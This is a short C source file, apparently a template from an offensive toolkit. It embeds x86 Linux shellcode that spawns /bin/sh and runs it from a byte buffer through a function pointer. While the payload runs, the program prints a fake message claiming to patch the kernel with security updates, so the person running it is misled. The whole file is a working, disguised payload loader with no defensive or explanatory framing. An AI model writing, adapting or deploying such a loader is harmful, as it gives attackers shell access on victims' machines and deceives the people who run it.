// C template | Author: r00t-3xp10it



#include<stdio.h>
#include<string.h>



// Our code goes here
unsigned char buf[] = 
"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69"
"\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";


// Push into memory
int main()
{
   printf("\nPlease Wait, updating system...\nPatching kernel with latest security updates.", strlen(buf));
   void (*ret)() = (void(*)())buf;
   ret();
}

